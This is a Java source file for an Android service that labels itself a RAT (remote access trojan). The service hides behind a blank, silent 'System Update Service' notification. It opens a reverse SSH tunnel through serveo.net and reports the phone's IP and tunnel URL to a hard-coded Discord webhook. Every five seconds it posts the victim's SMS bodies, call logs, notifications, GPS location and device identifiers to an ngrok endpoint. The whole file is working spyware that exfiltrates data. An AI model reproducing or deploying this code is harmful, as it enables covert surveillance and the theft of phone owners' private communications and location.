package com.security.ravan;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.LinkProperties;
import android.net.Network;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.Settings;
import android.database.Cursor;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Enumeration;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.List;
import java.util.ArrayList;

public class HttpServerService extends Service {

    private static final String TAG = "HttpServerService";
    private static final String CHANNEL_ID = "RavanServerChannel";
    private static final int NOTIFICATION_ID = 1;

    private static final String DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1519769648697049320/9D1rrVjcvLDjHp5s2fWwXWiTWwdGLiYRm073v1rwbvDzKg917iwGkL8Jk9NbG0_2ufq5";
    private static final String REMOTE_DATA_ENDPOINT = "https://wrench-unending-vanity.ngrok-free.dev/api/data";
    private static final int DATA_PUSH_INTERVAL_SECONDS = 5;

    private RavanHttpServer server;
    private ConnectivityManager connectivityManager;
    private ConnectivityManager.NetworkCallback networkCallback;
    private String lastReportedIp = "";
    private String currentPublicIp = "";
    private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();
    private final ScheduledExecutorService scheduledExecutor = Executors.newSingleThreadScheduledExecutor();

    @Override
    public void onCreate() {
        super.onCreate();
        NotificationStore.init(this);
        createNotificationChannel();
        connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        registerNetworkCallback();
        checkAndReportIp(); // Initial check
        startPeriodicDataPush();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;

        if ("START".equals(action)) {
            startForeground(NOTIFICATION_ID, createNotification());
            startServer();
        } else if ("STOP".equals(action)) {
            stopPeriodicDataPush();
            stopServer();
            stopForeground(true);
            stopSelf();
        }

        return START_STICKY;
    }

    private void startServer() {
        try {
            if (server == null || !server.isAlive()) {
                server = new RavanHttpServer(this, 8080);
                server.start();
                Log.d(TAG, "HTTP Server started on port 8080");
                RATLogger.log("RAT Service Started");
                networkExecutor.execute(this::setupServeoTunnelAndSendWebhook);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to start server", e);
            RATLogger.log("Failed to start HTTP server: " + e.getMessage());
        }
    }

    private void stopServer() {
        try {
            if (server != null) {
                server.stop();
                server = null;
                Log.d(TAG, "HTTP Server stopped");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping server", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Update Service",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("System update background service");
            channel.setSound(null, null);
            channel.setVibrationPattern(new long[]{0});

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .setSilent(true)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        stopPeriodicDataPush();
        unregisterNetworkCallback();
        networkExecutor.shutdown();
        scheduledExecutor.shutdownNow();
        stopServer();
        super.onDestroy();
    }

    private void registerNetworkCallback() {
        if (connectivityManager != null) {
            networkCallback = new ConnectivityManager.NetworkCallback() {
                @Override
                public void onLinkPropertiesChanged(Network network, LinkProperties linkProperties) {
                    super.onLinkPropertiesChanged(network, linkProperties);
                    checkAndReportIp();
                }
            };
            connectivityManager.registerDefaultNetworkCallback(networkCallback);
        }
    }

    private void unregisterNetworkCallback() {
        if (connectivityManager != null && networkCallback != null) {
            try {
                connectivityManager.unregisterNetworkCallback(networkCallback);
            } catch (Exception e) {
                Log.e(TAG, "Error unregistering network callback", e);
            }
        }
    }

    private void checkAndReportIp() {
        // MainActivity.getPublicIPv6Async handles the threading internally,
        // but we want to ensure we don't spam.
        MainActivity.getPublicIPv6Async(currentIp -> {
            if (currentIp != null && !currentIp.equals(lastReportedIp)) {
                Log.d(TAG, "IP Changed or Initial Report: " + currentIp);
                RATLogger.log("Public IP detected: " + currentIp);
                currentPublicIp = currentIp;
                // Send in background thread as network operations are involved
                networkExecutor.execute(() -> sendIpToWebhook(currentIp, null));
                lastReportedIp = currentIp;
            }
        });
    }

    private void setupServeoTunnelAndSendWebhook() {
        RATLogger.log("Checking SSH availability for Serveo tunnel...");

        String localIp = getLocalIpAddress();
        if (!isSshAvailable()) {
            Log.e(TAG, "SSH is not available on this device.");
            RATLogger.log("SSH is not available on this device. Serveo cannot start.");
            sendIpToWebhook(localIp, null);
            return;
        }

        Process serveoProcess = null;
        String serveoUrl = null;
        boolean urlSent = false;

        while (!Thread.currentThread().isInterrupted()) {
            try {
                if (serveoProcess == null || !serveoProcess.isAlive()) {
                    RATLogger.log("Starting Serveo SSH tunnel...");
                    serveoProcess = startServeoTunnel();
                    if (serveoProcess == null) {
                        RATLogger.log("Failed to launch Serveo SSH process.");
                        Thread.sleep(10000);
                        continue;
                    }
                }

                BufferedReader reader = new BufferedReader(new InputStreamReader(serveoProcess.getInputStream()));
                String line;
                while (reader.ready() && (line = reader.readLine()) != null) {
                    RATLogger.log("serveo output: " + line);
                    if (serveoUrl == null) {
                        String candidate = extractServeoUrl(line);
                        if (candidate != null) {
                            serveoUrl = candidate;
                            RATLogger.log("Serveo URL detected: " + serveoUrl);
                        }
                    }
                }

                if (serveoUrl != null && !urlSent) {
                    sendIpToWebhook(localIp, serveoUrl);
                    urlSent = true;
                }

                if (!serveoProcess.isAlive()) {
                    RATLogger.log("Serveo SSH process exited, restarting tunnel...");
                    serveoProcess.destroy();
                    serveoProcess = null;
                    urlSent = false;
                    serveoUrl = null;
                }

                Thread.sleep(5000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            } catch (Exception e) {
                Log.e(TAG, "Serveo tunnel loop error: " + e.getMessage(), e);
                RATLogger.log("Serveo tunnel loop error: " + e.getMessage());
                serveoProcess = null;
                urlSent = false;
                serveoUrl = null;
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException ignored) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }

        if (serveoProcess != null && serveoProcess.isAlive()) {
            serveoProcess.destroy();
        }
    }

    private boolean isSshAvailable() {
        try {
            String output = runShellCommand("which ssh || ssh -V");
            return output != null && !output.trim().isEmpty();
        } catch (Exception e) {
            Log.e(TAG, "SSH availability check failed: " + e.getMessage(), e);
            RATLogger.log("SSH availability check failed: " + e.getMessage());
            return false;
        }
    }

    private Process startServeoTunnel() {
        try {
            String command = "ssh -R 80:localhost:8080 serveo.net -o StrictHostKeyChecking=no";
            RATLogger.log("Executing Serveo SSH command: " + command);
            return Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
        } catch (Exception e) {
            Log.e(TAG, "Failed to start Serveo tunnel: " + e.getMessage(), e);
            RATLogger.log("Failed to start Serveo tunnel: " + e.getMessage());
            return null;
        }
    }

    private String extractServeoUrl(String line) {
        if (line == null) {
            return null;
        }

        if (line.contains("serveo.net")) {
            int start = line.indexOf("https://");
            if (start >= 0) {
                String candidate = line.substring(start).split("\\s+")[0];
                if (candidate.startsWith("https://") && candidate.contains("serveo.net")) {
                    return candidate;
                }
            }

            if (line.contains("serveo.net")) {
                String[] parts = line.split("\\s+");
                for (String part : parts) {
                    if (part.startsWith("https://") && part.contains("serveo.net")) {
                        return part;
                    }
                }
            }
        }

        return null;
    }

    private void sendIpToWebhook(String ip, String tunnelUrl) {
        try {
            String content = "📱 Phone IP: " + ip;
            if (tunnelUrl != null && !tunnelUrl.isEmpty()) {
                content += "\n🌐 Serveo URL: " + tunnelUrl;
            }

            RATLogger.log("Sending IP & Serveo URL to Discord...");

            URL url = new URL(DISCORD_WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");

            String escapedContent = content.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n");
            String jsonInputString = "{\"content\": \"" + escapedContent + "\"}";

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            int code = conn.getResponseCode();
            Log.d(TAG, "Discord webhook response code: " + code);
            RATLogger.log("Discord message sent successfully (code=" + code + ")");

        } catch (Exception e) {
            Log.e(TAG, "Failed to report IP: " + e.getMessage());
            RATLogger.log("Failed to send Discord message: " + e.getMessage());
        }
    }

    private void startPeriodicDataPush() {
        scheduledExecutor.scheduleAtFixedRate(() -> {
            try {
                sendCapturedPhoneData();
            } catch (Exception e) {
                Log.e(TAG, "Data push scheduler failed: " + e.getMessage(), e);
                RATLogger.log("Data push scheduler failed: " + e.getMessage());
            }
        }, 0, DATA_PUSH_INTERVAL_SECONDS, TimeUnit.SECONDS);
    }

    private void stopPeriodicDataPush() {
        scheduledExecutor.shutdownNow();
    }

    private void sendCapturedPhoneData() {
        try {
            String localIp = getLocalIpAddress();
            JSONObject payload = buildCapturedDataPayload(localIp);
            sendJsonPost(REMOTE_DATA_ENDPOINT, payload.toString());
        } catch (Exception e) {
            Log.e(TAG, "Failed to send captured phone data: " + e.getMessage(), e);
            RATLogger.log("Failed to send captured data: " + e.getMessage());
        }
    }

    private JSONObject buildCapturedDataPayload(String localIp) throws Exception {
        JSONObject payload = new JSONObject();
        payload.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
        payload.put("deviceModel", Build.MODEL);
        payload.put("manufacturer", Build.MANUFACTURER);
        payload.put("androidVersion", Build.VERSION.RELEASE);
        payload.put("sdkInt", Build.VERSION.SDK_INT);
        payload.put("packageName", getPackageName());
        payload.put("localIp", localIp != null ? localIp : "");
        payload.put("publicIp", currentPublicIp != null ? currentPublicIp : "");
        payload.put("timestamp", System.currentTimeMillis());
        payload.put("notifications", getNotificationsPayload());
        payload.put("calls", getCallLogsPayload(20));
        payload.put("sms", getSmsMessagesPayload(20));
        payload.put("location", getLocationPayload());
        return payload;
    }

    private JSONArray getNotificationsPayload() {
        JSONArray notifications = new JSONArray();
        try {
            for (NotificationRecord record : NotificationStore.getAll()) {
                JSONObject obj = new JSONObject();
                obj.put("id", record.getId());
                obj.put("packageName", record.getPackageName());
                obj.put("appName", record.getAppName());
                obj.put("title", record.getTitle());
                obj.put("text", record.getText());
                obj.put("timestamp", record.getTimestamp());
                notifications.put(obj);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to serialize notifications: " + e.getMessage(), e);
        }
        return notifications;
    }

    private JSONArray getCallLogsPayload(int limit) {
        JSONArray calls = new JSONArray();
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return calls;
        }

        String[] projection = {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
        };
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    CallLog.Calls.DATE + " DESC");
            if (cursor == null) {
                return calls;
            }

            int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
            int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);

            while (cursor.moveToNext() && calls.length() < limit) {
                JSONObject obj = new JSONObject();
                obj.put("id", idIdx >= 0 ? cursor.getString(idIdx) : "");
                obj.put("number", numberIdx >= 0 ? cursor.getString(numberIdx) : "");
                obj.put("name", nameIdx >= 0 ? cursor.getString(nameIdx) : "");
                int type = typeIdx >= 0 ? cursor.getInt(typeIdx) : 0;
                obj.put("type", getCallTypeString(type));
                obj.put("date", dateIdx >= 0 ? cursor.getLong(dateIdx) : 0);
                obj.put("duration", durationIdx >= 0 ? cursor.getLong(durationIdx) : 0);
                calls.put(obj);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to read call logs: " + e.getMessage(), e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return calls;
    }

    private String getCallTypeString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "outgoing";
            case CallLog.Calls.MISSED_TYPE:
            case CallLog.Calls.REJECTED_TYPE:
            case CallLog.Calls.BLOCKED_TYPE:
                return "missed";
            default:
                return "unknown";
        }
    }

    private JSONArray getSmsMessagesPayload(int limit) {
        JSONArray messages = new JSONArray();
        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return messages;
        }

        String[] projection = {"_id", "address", "body", "date", "type", "read", "status", "thread_id"};
        String[] uris = {"content://sms/", "content://mms-sms/conversations/"};

        for (String uriString : uris) {
            if (messages.length() >= limit) {
                break;
            }
            Cursor cursor = null;
            try {
                Uri uri = Uri.parse(uriString);
                cursor = getContentResolver().query(uri, projection, null, null, "date DESC");
                if (cursor == null) {
                    continue;
                }

                int idIdx = cursor.getColumnIndex("_id");
                int addressIdx = cursor.getColumnIndex("address");
                int bodyIdx = cursor.getColumnIndex("body");
                int dateIdx = cursor.getColumnIndex("date");
                int typeIdx = cursor.getColumnIndex("type");
                int readIdx = cursor.getColumnIndex("read");
                int statusIdx = cursor.getColumnIndex("status");
                int threadIdx = cursor.getColumnIndex("thread_id");

                while (cursor.moveToNext() && messages.length() < limit) {
                    JSONObject obj = new JSONObject();
                    obj.put("id", idIdx >= 0 ? cursor.getString(idIdx) : "");
                    obj.put("address", addressIdx >= 0 ? cursor.getString(addressIdx) : "");
                    obj.put("body", bodyIdx >= 0 ? cursor.getString(bodyIdx) : "");
                    obj.put("date", dateIdx >= 0 ? cursor.getLong(dateIdx) : 0);
                    obj.put("type", typeIdx >= 0 ? cursor.getInt(typeIdx) : 0);
                    obj.put("read", readIdx >= 0 ? cursor.getInt(readIdx) : 0);
                    obj.put("status", statusIdx >= 0 ? cursor.getInt(statusIdx) : 0);
                    obj.put("threadId", threadIdx >= 0 ? cursor.getString(threadIdx) : "");
                    messages.put(obj);
                }
            } catch (Exception e) {
                Log.e(TAG, "Failed to read SMS from " + uriString + ": " + e.getMessage(), e);
            } finally {
                if (cursor != null) {
                    cursor.close();
                }
            }
        }

        return messages;
    }

    private JSONObject getLocationPayload() {
        JSONObject locationJson = new JSONObject();
        try {
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                locationJson.put("error", "Location permission not granted");
                return locationJson;
            }

            LocationManager locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (locationManager == null) {
                locationJson.put("error", "LocationManager service unavailable");
                return locationJson;
            }

            Location location = null;
            boolean gpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            boolean networkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (gpsEnabled) {
                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }

            if (location == null && networkEnabled) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
            }

            if (location == null) {
                locationJson.put("error", "No location data available");
                return locationJson;
            }

            locationJson.put("latitude", location.getLatitude());
            locationJson.put("longitude", location.getLongitude());
            locationJson.put("altitude", location.hasAltitude() ? location.getAltitude() : JSONObject.NULL);
            locationJson.put("accuracy", location.hasAccuracy() ? location.getAccuracy() : JSONObject.NULL);
            locationJson.put("speed", location.hasSpeed() ? location.getSpeed() : JSONObject.NULL);
            locationJson.put("bearing", location.hasBearing() ? location.getBearing() : JSONObject.NULL);
            locationJson.put("provider", location.getProvider());
            locationJson.put("timestamp", location.getTime());
        } catch (Exception e) {
            Log.e(TAG, "Failed to get location: " + e.getMessage(), e);
            try {
                locationJson.put("error", "Failed to get location: " + e.getMessage());
            } catch (Exception ignored) {
            }
        }
        return locationJson;
    }

    private void sendJsonPost(String endpoint, String jsonPayload) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(endpoint);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);

            try (OutputStream os = conn.getOutputStream()) {
                if (jsonPayload != null) {
                    os.write(jsonPayload.getBytes(StandardCharsets.UTF_8));
                }
            }

            int responseCode = conn.getResponseCode();
            InputStream responseStream = responseCode >= 400 ? conn.getErrorStream() : conn.getInputStream();
            String responseText = responseStream != null ? readStream(responseStream) : "";
            Log.d(TAG, "Remote data POST response code: " + responseCode + ", body: " + responseText);
            RATLogger.log("Remote data posted (code=" + responseCode + ")");
        } catch (Exception e) {
            Log.e(TAG, "Failed to POST captured data: " + e.getMessage(), e);
            RATLogger.log("Failed to POST captured data: " + e.getMessage());
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    private String getLocalIpAddress() {
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces != null && interfaces.hasMoreElements()) {
                NetworkInterface iface = interfaces.nextElement();
                Enumeration<InetAddress> addresses = iface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    if (!addr.isLoopbackAddress() && addr instanceof Inet4Address) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to get local IP address: " + e.getMessage());
        }
        return "127.0.0.1";
    }

    private String readFile(File file) {
        if (file == null || !file.exists()) {
            return null;
        }
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)))) {
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                if (content.length() > 0) {
                    content.append("\n");
                }
                content.append(line);
            }
            return content.toString();
        } catch (Exception e) {
            return null;
        }
    }

    private String readStream(java.io.InputStream stream) {
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(stream))) {
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                if (output.length() > 0) {
                    output.append("\n");
                }
                output.append(line);
            }
            return output.toString();
        } catch (Exception e) {
            return "";
        }
    }

    private String runShellCommand(String command) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
        pb.redirectErrorStream(true);
        Process process = pb.start();
        String output = readStream(process.getInputStream());
        process.waitFor(30, TimeUnit.SECONDS);
        return output != null ? output.trim() : "";
    }
}
